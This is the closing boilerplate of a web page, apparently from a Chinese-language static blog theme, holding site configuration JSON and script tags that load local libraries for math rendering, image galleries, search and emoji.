        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true},"twemoji":true};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
</body>

</html>